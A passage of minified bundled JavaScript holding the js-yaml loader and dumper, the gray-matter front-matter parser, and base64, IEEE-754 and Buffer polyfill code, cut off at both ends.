"'+r.kind+'"'),C=0,_=r.implicitTypes.length;C<_;C+=1)if(R=r.implicitTypes[C],R.resolve(r.result)){r.result=R.construct(r.result),r.tag=R.tag,r.anchor!==null&&(r.anchorMap[r.anchor]=r.result);break}}else f.call(r.typeMap[r.kind||"fallback"],r.tag)?(R=r.typeMap[r.kind||"fallback"][r.tag],r.result!==null&&R.kind!==r.kind&&F(r,"unacceptable node kind for !<"+r.tag+'> tag; it should be "'+R.kind+'", not "'+r.kind+'"'),R.resolve(r.result)?(r.result=R.construct(r.result),r.anchor!==null&&(r.anchorMap[r.anchor]=r.result)):F(r,"cannot resolve a node with !<"+r.tag+"> explicit tag")):F(r,"unknown tag !<"+r.tag+">");return r.listener!==null&&r.listener("close",r),r.tag!==null||r.anchor!==null||q}function Ce(r){var S=r.position,t,e,n,a=!1,l;for(r.version=null,r.checkLineBreaks=r.legacy,r.tagMap={},r.anchorMap={};(l=r.input.charCodeAt(r.position))!==0&&(V(r,!0,-1),l=r.input.charCodeAt(r.position),!(r.lineIndent>0||l!==37));){for(a=!0,l=r.input.charCodeAt(++r.position),t=r.position;l!==0&&!D(l);)l=r.input.charCodeAt(++r.position);for(e=r.input.slice(t,r.position),n=[],e.length<1&&F(r,"directive name must not be less than one character in length");l!==0;){for(;B(l);)l=r.input.charCodeAt(++r.position);if(l===35){do l=r.input.charCodeAt(++r.position);while(l!==0&&!N(l));break}if(N(l))break;for(t=r.position;l!==0&&!D(l);)l=r.input.charCodeAt(++r.position);n.push(r.input.slice(t,r.position))}l!==0&&me(r),f.call(pe,e)?pe[e](r,e,n):oe(r,'unknown document directive "'+e+'"')}if(V(r,!0,-1),r.lineIndent===0&&r.input.charCodeAt(r.position)===45&&r.input.charCodeAt(r.position+1)===45&&r.input.charCodeAt(r.position+2)===45?(r.position+=3,V(r,!0,-1)):a&&F(r,"directives end mark is expected"),ne(r,r.lineIndent-1,v,!1,!0),V(r,!0,-1),r.checkLineBreaks&&w.test(r.input.slice(S,r.position))&&oe(r,"non-ASCII line breaks are interpreted as content"),r.documents.push(r.result),r.position===r.lineStart&&se(r)){r.input.charCodeAt(r.position)===46&&(r.position+=3,V(r,!0,-1));return}if(r.position<r.length-1)F(r,"end of the stream or a document separator is expected");else return}function ve(r,S){r=String(r),S=S||{},r.length!==0&&(r.charCodeAt(r.length-1)!==10&&r.charCodeAt(r.length-1)!==13&&(r+=`
`),r.charCodeAt(0)===65279&&(r=r.slice(1)));var t=new Pe(r,S),e=r.indexOf("\0");for(e!==-1&&(t.position=e,F(t,"null byte is not allowed in input")),t.input+="\0";t.input.charCodeAt(t.position)===32;)t.lineIndent+=1,t.position+=1;for(;t.position<t.length-1;)Ce(t);return t.documents}function de(r,S,t){S!==null&&typeof S=="object"&&typeof t>"u"&&(t=S,S=null);var e=ve(r,t);if(typeof S!="function")return e;for(var n=0,a=e.length;n<a;n+=1)S(e[n])}function $(r,S){var t=ve(r,S);if(t.length!==0){if(t.length===1)return t[0];throw new i("expected a single document in the stream, but found more")}}function xe(r,S,t){return typeof S=="object"&&S!==null&&typeof t>"u"&&(t=S,S=null),de(r,S,o.extend({schema:c},t))}function Ae(r,S){return $(r,o.extend({schema:c},S))}return loader.loadAll=de,loader.load=$,loader.safeLoadAll=xe,loader.safeLoad=Ae,loader}var dumper={},hasRequiredDumper;function requireDumper(){if(hasRequiredDumper)return dumper;hasRequiredDumper=1;var o=requireCommon(),i=requireException(),s=requireDefault_full(),c=requireDefault_safe(),d=Object.prototype.toString,f=Object.prototype.hasOwnProperty,h=9,u=10,m=13,v=32,b=33,x=34,P=35,E=37,w=38,T=39,j=42,k=44,I=45,N=58,B=61,D=62,O=63,L=64,z=91,Y=93,ae=96,ie=123,fe=124,te=125,Q={};Q[0]="\\0",Q[7]="\\a",Q[8]="\\b",Q[9]="\\t",Q[10]="\\n",Q[11]="\\v",Q[12]="\\f",Q[13]="\\r",Q[27]="\\e",Q[34]='\\"',Q[92]="\\\\",Q[133]="\\N",Q[160]="\\_",Q[8232]="\\L",Q[8233]="\\P";var Z=["y","Y","yes","Yes","YES","on","On","ON","n","N","no","No","NO","off","Off","OFF"];function Pe(a,l){var p,y,A,q,C,_,R;if(l===null)return{};for(p={},y=Object.keys(l),A=0,q=y.length;A<q;A+=1)C=y[A],_=String(l[C]),C.slice(0,2)==="!!"&&(C="tag:yaml.org,2002:"+C.slice(2)),R=a.compiledTypeMap.fallback[C],R&&f.call(R.styleAliases,_)&&(_=R.styleAliases[_]),p[C]=_;return p}function be(a){var l,p,y;if(l=a.toString(16).toUpperCase(),a<=255)p="x",y=2;else if(a<=65535)p="u",y=4;else if(a<=4294967295)p="U",y=8;else throw new i("code point within a string may not be greater than 0xFFFFFFFF");return"\\"+p+o.repeat("0",y-l.length)+l}function F(a){this.schema=a.schema||s,this.indent=Math.max(1,a.indent||2),this.noArrayIndent=a.noArrayIndent||!1,this.skipInvalid=a.skipInvalid||!1,this.flowLevel=o.isNothing(a.flowLevel)?-1:a.flowLevel,this.styleMap=Pe(this.schema,a.styles||null),this.sortKeys=a.sortKeys||!1,this.lineWidth=a.lineWidth||80,this.noRefs=a.noRefs||!1,this.noCompatMode=a.noCompatMode||!1,this.condenseFlow=a.condenseFlow||!1,this.implicitTypes=this.schema.compiledImplicit,this.explicitTypes=this.schema.compiledExplicit,this.tag=null,this.result="",this.duplicates=[],this.usedDuplicates=null}function oe(a,l){for(var p=o.repeat(" ",l),y=0,A=-1,q="",C,_=a.length;y<_;)A=a.indexOf(`
`,y),A===-1?(C=a.slice(y),y=_):(C=a.slice(y,A+1),y=A+1),C.length&&C!==`
`&&(q+=p),q+=C;return q}function pe(a,l){return`
`+o.repeat(" ",a.indent*l)}function W(a,l){var p,y,A;for(p=0,y=a.implicitTypes.length;p<y;p+=1)if(A=a.implicitTypes[p],A.resolve(l))return!0;return!1}function K(a){return a===v||a===h}function J(a){return 32<=a&&a<=126||161<=a&&a<=55295&&a!==8232&&a!==8233||57344<=a&&a<=65533&&a!==65279||65536<=a&&a<=1114111}function me(a){return J(a)&&!K(a)&&a!==65279&&a!==m&&a!==u}function V(a,l){return J(a)&&a!==65279&&a!==k&&a!==z&&a!==Y&&a!==ie&&a!==te&&a!==N&&(a!==P||l&&me(l))}function se(a){return J(a)&&a!==65279&&!K(a)&&a!==I&&a!==O&&a!==N&&a!==k&&a!==z&&a!==Y&&a!==ie&&a!==te&&a!==P&&a!==w&&a!==j&&a!==b&&a!==fe&&a!==B&&a!==D&&a!==T&&a!==x&&a!==E&&a!==L&&a!==ae}function ce(a){var l=/^\n* /;return l.test(a)}var ee=1,he=2,ge=3,Ee=4,le=5;function re(a,l,p,y,A){var q,C,_,R=!1,M=!1,U=y!==-1,H=-1,G=se(a.charCodeAt(0))&&!K(a.charCodeAt(a.length-1));if(l)for(q=0;q<a.length;q++){if(C=a.charCodeAt(q),!J(C))return le;_=q>0?a.charCodeAt(q-1):null,G=G&&V(C,_)}else{for(q=0;q<a.length;q++){if(C=a.charCodeAt(q),C===u)R=!0,U&&(M=M||q-H-1>y&&a[H+1]!==" ",H=q);else if(!J(C))return le;_=q>0?a.charCodeAt(q-1):null,G=G&&V(C,_)}M=M||U&&q-H-1>y&&a[H+1]!==" "}return!R&&!M?G&&!A(a)?ee:he:p>9&&ce(a)?le:M?Ee:ge}function ue(a,l,p,y){a.dump=(function(){if(l.length===0)return"''";if(!a.noCompatMode&&Z.indexOf(l)!==-1)return"'"+l+"'";var A=a.indent*Math.max(1,p),q=a.lineWidth===-1?-1:Math.max(Math.min(a.lineWidth,40),a.lineWidth-A),C=y||a.flowLevel>-1&&p>=a.flowLevel;function _(R){return W(a,R)}switch(re(l,C,a.indent,q,_)){case ee:return l;case he:return"'"+l.replace(/'/g,"''")+"'";case ge:return"|"+Se(l,a.indent)+we(oe(l,A));case Ee:return">"+Se(l,a.indent)+we(oe(ye(l,q),A));case le:return'"'+Ce(l)+'"';default:throw new i("impossible error: invalid scalar style")}})()}function Se(a,l){var p=ce(a)?String(l):"",y=a[a.length-1]===`
`,A=y&&(a[a.length-2]===`
`||a===`
`),q=A?"+":y?"":"-";return p+q+`
`}function we(a){return a[a.length-1]===`
`?a.slice(0,-1):a}function ye(a,l){for(var p=/(\n+)([^\n]*)/g,y=(function(){var M=a.indexOf(`
`);return M=M!==-1?M:a.length,p.lastIndex=M,ne(a.slice(0,M),l)})(),A=a[0]===`
`||a[0]===" ",q,C;C=p.exec(a);){var _=C[1],R=C[2];q=R[0]===" ",y+=_+(!A&&!q&&R!==""?`
`:"")+ne(R,l),A=q}return y}function ne(a,l){if(a===""||a[0]===" ")return a;for(var p=/ [^ ]/g,y,A=0,q,C=0,_=0,R="";y=p.exec(a);)_=y.index,_-A>l&&(q=C>A?C:_,R+=`
`+a.slice(A,q),A=q+1),C=_;return R+=`
`,a.length-A>l&&C>A?R+=a.slice(A,C)+`
`+a.slice(C+1):R+=a.slice(A),R.slice(1)}function Ce(a){for(var l="",p,y,A,q=0;q<a.length;q++){if(p=a.charCodeAt(q),p>=55296&&p<=56319&&(y=a.charCodeAt(q+1),y>=56320&&y<=57343)){l+=be((p-55296)*1024+y-56320+65536),q++;continue}A=Q[p],l+=!A&&J(p)?a[q]:A||be(p)}return l}function ve(a,l,p){var y="",A=a.tag,q,C;for(q=0,C=p.length;q<C;q+=1)r(a,l,p[q],!1,!1)&&(q!==0&&(y+=","+(a.condenseFlow?"":" ")),y+=a.dump);a.tag=A,a.dump="["+y+"]"}function de(a,l,p,y){var A="",q=a.tag,C,_;for(C=0,_=p.length;C<_;C+=1)r(a,l+1,p[C],!0,!0)&&((!y||C!==0)&&(A+=pe(a,l)),a.dump&&u===a.dump.charCodeAt(0)?A+="-":A+="- ",A+=a.dump);a.tag=q,a.dump=A||"[]"}function $(a,l,p){var y="",A=a.tag,q=Object.keys(p),C,_,R,M,U;for(C=0,_=q.length;C<_;C+=1)U="",C!==0&&(U+=", "),a.condenseFlow&&(U+='"'),R=q[C],M=p[R],r(a,l,R,!1,!1)&&(a.dump.length>1024&&(U+="? "),U+=a.dump+(a.condenseFlow?'"':"")+":"+(a.condenseFlow?"":" "),r(a,l,M,!1,!1)&&(U+=a.dump,y+=U));a.tag=A,a.dump="{"+y+"}"}function xe(a,l,p,y){var A="",q=a.tag,C=Object.keys(p),_,R,M,U,H,G;if(a.sortKeys===!0)C.sort();else if(typeof a.sortKeys=="function")C.sort(a.sortKeys);else if(a.sortKeys)throw new i("sortKeys must be a boolean or a function");for(_=0,R=C.length;_<R;_+=1)G="",(!y||_!==0)&&(G+=pe(a,l)),M=C[_],U=p[M],r(a,l+1,M,!0,!0,!0)&&(H=a.tag!==null&&a.tag!=="?"||a.dump&&a.dump.length>1024,H&&(a.dump&&u===a.dump.charCodeAt(0)?G+="?":G+="? "),G+=a.dump,H&&(G+=pe(a,l)),r(a,l+1,U,!0,H)&&(a.dump&&u===a.dump.charCodeAt(0)?G+=":":G+=": ",G+=a.dump,A+=G));a.tag=q,a.dump=A||"{}"}function Ae(a,l,p){var y,A,q,C,_,R;for(A=p?a.explicitTypes:a.implicitTypes,q=0,C=A.length;q<C;q+=1)if(_=A[q],(_.instanceOf||_.predicate)&&(!_.instanceOf||typeof l=="object"&&l instanceof _.instanceOf)&&(!_.predicate||_.predicate(l))){if(a.tag=p?_.tag:"?",_.represent){if(R=a.styleMap[_.tag]||_.defaultStyle,d.call(_.represent)==="[object Function]")y=_.represent(l,R);else if(f.call(_.represent,R))y=_.represent[R](l,R);else throw new i("!<"+_.tag+'> tag resolver accepts not "'+R+'" style');a.dump=y}return!0}return!1}function r(a,l,p,y,A,q){a.tag=null,a.dump=p,Ae(a,p,!1)||Ae(a,p,!0);var C=d.call(a.dump);y&&(y=a.flowLevel<0||a.flowLevel>l);var _=C==="[object Object]"||C==="[object Array]",R,M;if(_&&(R=a.duplicates.indexOf(p),M=R!==-1),(a.tag!==null&&a.tag!=="?"||M||a.indent!==2&&l>0)&&(A=!1),M&&a.usedDuplicates[R])a.dump="*ref_"+R;else{if(_&&M&&!a.usedDuplicates[R]&&(a.usedDuplicates[R]=!0),C==="[object Object]")y&&Object.keys(a.dump).length!==0?(xe(a,l,a.dump,A),M&&(a.dump="&ref_"+R+a.dump)):($(a,l,a.dump),M&&(a.dump="&ref_"+R+" "+a.dump));else if(C==="[object Array]"){var U=a.noArrayIndent&&l>0?l-1:l;y&&a.dump.length!==0?(de(a,U,a.dump,A),M&&(a.dump="&ref_"+R+a.dump)):(ve(a,U,a.dump),M&&(a.dump="&ref_"+R+" "+a.dump))}else if(C==="[object String]")a.tag!=="?"&&ue(a,a.dump,l,q);else{if(a.skipInvalid)return!1;throw new i("unacceptable kind of an object to dump "+C)}a.tag!==null&&a.tag!=="?"&&(a.dump="!<"+a.tag+"> "+a.dump)}return!0}function S(a,l){var p=[],y=[],A,q;for(t(a,p,y),A=0,q=y.length;A<q;A+=1)l.duplicates.push(p[y[A]]);l.usedDuplicates=new Array(q)}function t(a,l,p){var y,A,q;if(a!==null&&typeof a=="object")if(A=l.indexOf(a),A!==-1)p.indexOf(A)===-1&&p.push(A);else if(l.push(a),Array.isArray(a))for(A=0,q=a.length;A<q;A+=1)t(a[A],l,p);else for(y=Object.keys(a),A=0,q=y.length;A<q;A+=1)t(a[y[A]],l,p)}function e(a,l){l=l||{};var p=new F(l);return p.noRefs||S(a,p),r(p,0,a,!0,!0)?p.dump+`
`:""}function n(a,l){return e(a,o.extend({schema:c},l))}return dumper.dump=e,dumper.safeDump=n,dumper}var hasRequiredJsYaml$1;function requireJsYaml$1(){if(hasRequiredJsYaml$1)return jsYaml$1;hasRequiredJsYaml$1=1;var o=requireLoader(),i=requireDumper();function s(c){return function(){throw new Error("Function "+c+" is deprecated and cannot be used.")}}return jsYaml$1.Type=requireType(),jsYaml$1.Schema=requireSchema(),jsYaml$1.FAILSAFE_SCHEMA=requireFailsafe(),jsYaml$1.JSON_SCHEMA=requireJson(),jsYaml$1.CORE_SCHEMA=requireCore(),jsYaml$1.DEFAULT_SAFE_SCHEMA=requireDefault_safe(),jsYaml$1.DEFAULT_FULL_SCHEMA=requireDefault_full(),jsYaml$1.load=o.load,jsYaml$1.loadAll=o.loadAll,jsYaml$1.safeLoad=o.safeLoad,jsYaml$1.safeLoadAll=o.safeLoadAll,jsYaml$1.dump=i.dump,jsYaml$1.safeDump=i.safeDump,jsYaml$1.YAMLException=requireException(),jsYaml$1.MINIMAL_SCHEMA=requireFailsafe(),jsYaml$1.SAFE_SCHEMA=requireDefault_safe(),jsYaml$1.DEFAULT_SCHEMA=requireDefault_full(),jsYaml$1.scan=s("scan"),jsYaml$1.parse=s("parse"),jsYaml$1.compose=s("compose"),jsYaml$1.addConstructor=s("addConstructor"),jsYaml$1}var jsYaml,hasRequiredJsYaml;function requireJsYaml(){if(hasRequiredJsYaml)return jsYaml;hasRequiredJsYaml=1;var o=requireJsYaml$1();return jsYaml=o,jsYaml}var hasRequiredEngines;function requireEngines(){return hasRequiredEngines||(hasRequiredEngines=1,(function(module,exports){const yaml=requireJsYaml(),engines=module.exports;engines.yaml={parse:yaml.safeLoad.bind(yaml),stringify:yaml.safeDump.bind(yaml)},engines.json={parse:JSON.parse.bind(JSON),stringify:function(o,i){const s=Object.assign({replacer:null,space:2},i);return JSON.stringify(o,s.replacer,s.space)}},engines.javascript={parse:function parse(str,options,wrap){try{return wrap!==!1&&(str=`(function() {
return `+str.trim()+`;
}());`),eval(str)||{}}catch(o){if(wrap!==!1&&/(unexpected|identifier)/i.test(o.message))return parse(str,options,!1);throw new SyntaxError(o)}},stringify:function(){throw new Error("stringifying JavaScript is not supported")}}})(engines)),engines.exports}var utils={};var stripBomString,hasRequiredStripBomString;function requireStripBomString(){return hasRequiredStripBomString||(hasRequiredStripBomString=1,stripBomString=function(o){return typeof o=="string"&&o.charAt(0)==="\uFEFF"?o.slice(1):o}),stripBomString}var hasRequiredUtils;function requireUtils(){return hasRequiredUtils||(hasRequiredUtils=1,(function(o){const i=requireStripBomString(),s=requireKindOf();o.define=function(c,d,f){Reflect.defineProperty(c,d,{enumerable:!1,configurable:!0,writable:!0,value:f})},o.isBuffer=function(c){return s(c)==="buffer"},o.isObject=function(c){return s(c)==="object"},o.toBuffer=function(c){return typeof c=="string"?Buffer.from(c):c},o.toString=function(c){if(o.isBuffer(c))return i(String(c));if(typeof c!="string")throw new TypeError("expected input to be a string or buffer");return i(c)},o.arrayify=function(c){return c?Array.isArray(c)?c:[c]:[]},o.startsWith=function(c,d,f){return typeof f!="number"&&(f=d.length),c.slice(0,f)===d}})(utils)),utils}var defaults,hasRequiredDefaults;function requireDefaults(){if(hasRequiredDefaults)return defaults;hasRequiredDefaults=1;const o=requireEngines(),i=requireUtils();return defaults=function(s){const c=Object.assign({},s);return c.delimiters=i.arrayify(c.delims||c.delimiters||"---"),c.delimiters.length===1&&c.delimiters.push(c.delimiters[0]),c.language=(c.language||c.lang||"yaml").toLowerCase(),c.engines=Object.assign({},o,c.parsers,c.engines),c},defaults}var engine,hasRequiredEngine;function requireEngine(){if(hasRequiredEngine)return engine;hasRequiredEngine=1,engine=function(i,s){let c=s.engines[i]||s.engines[o(i)];if(typeof c>"u")throw new Error('gray-matter engine "'+i+'" is not registered');return typeof c=="function"&&(c={parse:c}),c};function o(i){switch(i.toLowerCase()){case"js":case"javascript":return"javascript";case"coffee":case"coffeescript":case"cson":return"coffee";case"yaml":case"yml":return"yaml";default:return i}}return engine}var stringify,hasRequiredStringify;function requireStringify(){if(hasRequiredStringify)return stringify;hasRequiredStringify=1;const o=requireKindOf(),i=requireEngine(),s=requireDefaults();stringify=function(d,f,h){if(f==null&&h==null)switch(o(d)){case"object":f=d.data,h={};break;case"string":return d;default:throw new TypeError("expected file to be a string or object")}const u=d.content,m=s(h);if(f==null){if(!m.data)return d;f=m.data}const v=d.language||m.language,b=i(v,m);if(typeof b.stringify!="function")throw new TypeError('expected "'+v+'.stringify" to be a function');f=Object.assign({},d.data,f);const x=m.delimiters[0],P=m.delimiters[1],E=b.stringify(f,h).trim();let w="";return E!=="{}"&&(w=c(x)+c(E)+c(P)),typeof d.excerpt=="string"&&d.excerpt!==""&&u.indexOf(d.excerpt.trim())===-1&&(w+=c(d.excerpt)+c(P)),w+c(u)};function c(d){return d.slice(-1)!==`
`?d+`
`:d}return stringify}var excerpt,hasRequiredExcerpt;function requireExcerpt(){if(hasRequiredExcerpt)return excerpt;hasRequiredExcerpt=1;const o=requireDefaults();return excerpt=function(i,s){const c=o(s);if(i.data==null&&(i.data={}),typeof c.excerpt=="function")return c.excerpt(i,c);const d=i.data.excerpt_separator||c.excerpt_separator;if(d==null&&(c.excerpt===!1||c.excerpt==null))return i;const f=typeof c.excerpt=="string"?c.excerpt:d||c.delimiters[0],h=i.content.indexOf(f);return h!==-1&&(i.excerpt=i.content.slice(0,h)),i},excerpt}var toFile,hasRequiredToFile;function requireToFile(){if(hasRequiredToFile)return toFile;hasRequiredToFile=1;const o=requireKindOf(),i=requireStringify(),s=requireUtils();return toFile=function(c){return o(c)!=="object"&&(c={content:c}),o(c.data)!=="object"&&(c.data={}),c.contents&&c.content==null&&(c.content=c.contents),s.define(c,"orig",s.toBuffer(c.content)),s.define(c,"language",c.language||""),s.define(c,"matter",c.matter||""),s.define(c,"stringify",function(d,f){return f&&f.language&&(c.language=f.language),i(c,d,f)}),c.content=s.toString(c.content),c.isEmpty=!1,c.excerpt="",c},toFile}var parse,hasRequiredParse;function requireParse(){if(hasRequiredParse)return parse;hasRequiredParse=1;const o=requireEngine(),i=requireDefaults();return parse=function(s,c,d){const f=i(d),h=o(s,f);if(typeof h.parse!="function")throw new TypeError('expected "'+s+'.parse" to be a function');return h.parse(c,f)},parse}var grayMatter,hasRequiredGrayMatter;function requireGrayMatter(){if(hasRequiredGrayMatter)return grayMatter;hasRequiredGrayMatter=1;const o=require$$0,i=requireSectionMatter(),s=requireDefaults(),c=requireStringify(),d=requireExcerpt(),f=requireEngines(),h=requireToFile(),u=requireParse(),m=requireUtils();function v(x,P){if(x==="")return{data:{},content:x,excerpt:"",orig:x};let E=h(x);const w=v.cache[E.content];if(!P){if(w)return E=Object.assign({},w),E.orig=w.orig,E;v.cache[E.content]=E}return b(E,P)}function b(x,P){const E=s(P),w=E.delimiters[0],T=`
`+E.delimiters[1];let j=x.content;E.language&&(x.language=E.language);const k=w.length;if(!m.startsWith(j,w,k))return d(x,E),x;if(j.charAt(k)===w.slice(-1))return x;j=j.slice(k);const I=j.length,N=v.language(j,E);N.name&&(x.language=N.name,j=j.slice(N.raw.length));let B=j.indexOf(T);return B===-1&&(B=I),x.matter=j.slice(0,B),x.matter.replace(/^\s*#[^\n]+/gm,"").trim()===""?(x.isEmpty=!0,x.empty=x.content,x.data={}):x.data=u(x.language,x.matter,E),B===I?x.content="":(x.content=j.slice(B+T.length),x.content[0]==="\r"&&(x.content=x.content.slice(1)),x.content[0]===`
`&&(x.content=x.content.slice(1))),d(x,E),(E.sections===!0||typeof E.section=="function")&&i(x,E.section),x}return v.engines=f,v.stringify=function(x,P,E){return typeof x=="string"&&(x=v(x,E)),c(x,P,E)},v.read=function(x,P){const E=o.readFileSync(x,"utf8"),w=v(E,P);return w.path=x,w},v.test=function(x,P){return m.startsWith(x,s(P).delimiters[0])},v.language=function(x,P){const w=s(P).delimiters[0];v.test(x)&&(x=x.slice(w.length));const T=x.slice(0,x.search(/\r?\n/));return{raw:T,name:T?T.trim():""}},v.cache={},v.clearCache=function(){v.cache={}},grayMatter=v,grayMatter}var grayMatterExports=requireGrayMatter();const matter=getDefaultExportFromCjs(grayMatterExports);var buffer={},base64Js={},hasRequiredBase64Js;function requireBase64Js(){if(hasRequiredBase64Js)return base64Js;hasRequiredBase64Js=1,base64Js.byteLength=u,base64Js.toByteArray=v,base64Js.fromByteArray=P;for(var o=[],i=[],s=typeof Uint8Array<"u"?Uint8Array:Array,c="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",d=0,f=c.length;d<f;++d)o[d]=c[d],i[c.charCodeAt(d)]=d;i[45]=62,i[95]=63;function h(E){var w=E.length;if(w%4>0)throw new Error("Invalid string. Length must be a multiple of 4");var T=E.indexOf("=");T===-1&&(T=w);var j=T===w?0:4-T%4;return[T,j]}function u(E){var w=h(E),T=w[0],j=w[1];return(T+j)*3/4-j}function m(E,w,T){return(w+T)*3/4-T}function v(E){var w,T=h(E),j=T[0],k=T[1],I=new s(m(E,j,k)),N=0,B=k>0?j-4:j,D;for(D=0;D<B;D+=4)w=i[E.charCodeAt(D)]<<18|i[E.charCodeAt(D+1)]<<12|i[E.charCodeAt(D+2)]<<6|i[E.charCodeAt(D+3)],I[N++]=w>>16&255,I[N++]=w>>8&255,I[N++]=w&255;return k===2&&(w=i[E.charCodeAt(D)]<<2|i[E.charCodeAt(D+1)]>>4,I[N++]=w&255),k===1&&(w=i[E.charCodeAt(D)]<<10|i[E.charCodeAt(D+1)]<<4|i[E.charCodeAt(D+2)]>>2,I[N++]=w>>8&255,I[N++]=w&255),I}function b(E){return o[E>>18&63]+o[E>>12&63]+o[E>>6&63]+o[E&63]}function x(E,w,T){for(var j,k=[],I=w;I<T;I+=3)j=(E[I]<<16&16711680)+(E[I+1]<<8&65280)+(E[I+2]&255),k.push(b(j));return k.join("")}function P(E){for(var w,T=E.length,j=T%3,k=[],I=16383,N=0,B=T-j;N<B;N+=I)k.push(x(E,N,N+I>B?B:N+I));return j===1?(w=E[T-1],k.push(o[w>>2]+o[w<<4&63]+"==")):j===2&&(w=(E[T-2]<<8)+E[T-1],k.push(o[w>>10]+o[w>>4&63]+o[w<<2&63]+"=")),k.join("")}return base64Js}var ieee754={};var hasRequiredIeee754;function requireIeee754(){return hasRequiredIeee754||(hasRequiredIeee754=1,ieee754.read=function(o,i,s,c,d){var f,h,u=d*8-c-1,m=(1<<u)-1,v=m>>1,b=-7,x=s?d-1:0,P=s?-1:1,E=o[i+x];for(x+=P,f=E&(1<<-b)-1,E>>=-b,b+=u;b>0;f=f*256+o[i+x],x+=P,b-=8);for(h=f&(1<<-b)-1,f>>=-b,b+=c;b>0;h=h*256+o[i+x],x+=P,b-=8);if(f===0)f=1-v;else{if(f===m)return h?NaN:(E?-1:1)*(1/0);h=h+Math.pow(2,c),f=f-v}return(E?-1:1)*h*Math.pow(2,f-c)},ieee754.write=function(o,i,s,c,d,f){var h,u,m,v=f*8-d-1,b=(1<<v)-1,x=b>>1,P=d===23?Math.pow(2,-24)-Math.pow(2,-77):0,E=c?0:f-1,w=c?1:-1,T=i<0||i===0&&1/i<0?1:0;for(i=Math.abs(i),isNaN(i)||i===1/0?(u=isNaN(i)?1:0,h=b):(h=Math.floor(Math.log(i)/Math.LN2),i*(m=Math.pow(2,-h))<1&&(h--,m*=2),h+x>=1?i+=P/m:i+=P*Math.pow(2,1-x),i*m>=2&&(h++,m/=2),h+x>=b?(u=0,h=b):h+x>=1?(u=(i*m-1)*Math.pow(2,d),h=h+x):(u=i*Math.pow(2,x-1)*Math.pow(2,d),h=0));d>=8;o[s+E]=u&255,E+=w,u/=256,d-=8);for(h=h<<d|u,v+=d;v>0;o[s+E]=h&255,E+=w,h/=256,v-=8);o[s+E-w]|=T*128}),ieee754}var hasRequiredBuffer;function requireBuffer(){return hasRequiredBuffer||(hasRequiredBuffer=1,(function(o){const i=requireBase64Js(),s=requireIeee754(),c=typeof Symbol=="function"&&typeof Symbol.for=="function"?Symbol.for("nodejs.util.inspect.custom"):null;o.Buffer=u,o.SlowBuffer=I,o.INSPECT_MAX_BYTES=50;const d=2147483647;o.kMaxLength=d,u.TYPED_ARRAY_SUPPORT=f(),!u.TYPED_ARRAY_SUPPORT&&typeof console<"u"&&typeof console.error=="function"&&console.error("This browser lacks typed array (Uint8Array) support which is required by `buffer` v5.x. Use `buffer` v4.x if you require old browser support.");function f(){try{const t=new Uint8Array(1),e={foo:function(){return 42}};return Object.setPrototypeOf(e,Uint8Array.prototype),Object.setPrototypeOf(t,e),t.foo()===42}catch{return!1}}Object.defineProperty(u.prototype,"parent",{enumerable:!0,get:function(){if(u.isBuffer(this))return this.buffer}}),Object.defineProperty(u.prototype,"offset",{enumerable:!0,get:function(){if(u.isBuffer(this))return this.byteOffset}});function h(t){if(t>d)throw new RangeError('The value "'+t+'" is invalid for option "size"');const e=new Uint8Array(t);return Object.setPrototypeOf(e,u.prototype),e}function u(t,e,n){if(typeof t=="number"){if(typeof e=="string")throw new TypeError('The "string" argument must be of type string. Received type number');return x(t)}return m(t,e,n)}u.poolSize=8192;function m(t,e,n){if(typeof t=="string")return P(t,e);if(ArrayBuffer.isView(t))return w(t);if(t==null)throw new TypeError("The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type "+typeof t);if($(t,ArrayBuffer)||t&&$(t.buffer,ArrayBuffer)||typeof SharedArrayBuffer<"u"&&($(t,SharedArrayBuffer)||t&&$(t.buffer,SharedArrayBuffer)))return T(t,e,n);if(typeof t=="number")throw new TypeError('The "value" argument must not be of type number. Received type number');const a=t.valueOf&&t.valueOf();if(a!=null&&a!==t)return u.from(a,e,n);const l=j(t);if(l)return l;if(typeof Symbol<"u"&&Symbol.toPrimitive!=null&&typeof t[Symbol.toPrimitive]=="function")return u.from(t[Symbol.toPrimitive]("string"),e,n);throw new TypeError("The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type "+typeof t)}u.from=function(t,e,n){return m(t,e,n)},Object.setPrototypeOf(u.prototype,Uint8Array.prototype),Object.setPrototypeOf(u,Uint8Array);function v(t){if(typeof t!="number")throw new TypeError('"size" argument must be of type number');if(t<0)throw new RangeError('The value "'+t+'" is invalid for option "size"')}function b(t,e,n){return v(t),t<=0?h(t):e!==void 0?typeof n=="string"?h(t).fill(e,n):h(t).fill(e):h(t)}u.alloc=function(t,e,n){return b(t,e,n)};function x(t){return v(t),h(t<0?0:k(t)|0)}u.allocUnsafe=function(t){return x(t)},u.allocUnsafeSlow=function(t){return x(t)};function P(t,e){if((typeof e!="string"||e==="")&&(e="utf8"),!u.isEncoding(e))throw new TypeError("Unknown encoding: "+e);const n=N(t,e)|0;let a=h(n);const l=a.write(t,e);return l!==n&&(a=a.slice(0,l)),a}function E(t){const e=t.length<0?0:k(t.length)|0,n=h(e);for(let a=0;a<e;a+=1)n[a]=t[a]&255;return n}function w(t){if($(t,Uint8Array)){const e=new Uint8Array(t);return T(e.buffer,e.byteOffset,e.byteLength)}return E(t)}function T(t,e,n){if(e<0||t.byteLength<e)throw new RangeError('"offset" is outside of buffer bounds');if(t.byteLength<e+(n||0))throw new RangeError('"length" is outside of buffer bounds');let a;return e===void 0&&n===void 0?a=new Uint8Array(t):n===void 0?a=new Uint8Array(t,e):a=new Uint8Array(t,e,n),Object.setPrototypeOf(a,u.prototype),a}function j(t){if(u.isBuffer(t)){const e=k(t.length)|0,n=h(e);return n.length===0||t.copy(n,0,0,e),n}if(t.length!==void 0)return typeof t.length!="number"||xe(t.length)?h(0):E(t);if(t.type==="Buffer"&&Array.isArray(t.data))return E(t.data)}function k(t){if(t>=d)throw new RangeError("Attempt to allocate Buffer larger than maximum size: 0x"+d.toString(16)+" bytes");return t|0}function I(t){return+t!=t&&(t=0),u.alloc(+t)}u.isBuffer=function(e){return e!=null&&e._isBuffer===!0&&e!==u.prototype},u.compare=function(e,n){if($(e,Uint8Array)&&(e=u.from(e,e.offset,e.byteLength)),$(n,Uint8Array)&&(n=u.from(n,n.offset,n.byteLength)),!u.isBuffer(e)||!u.isBuffer(n))throw new TypeError('The "buf1", "buf2" arguments must be one of type Buffer or Uint8Array');if(e===n)return 0;let a=e.length,l=n.length;for(let 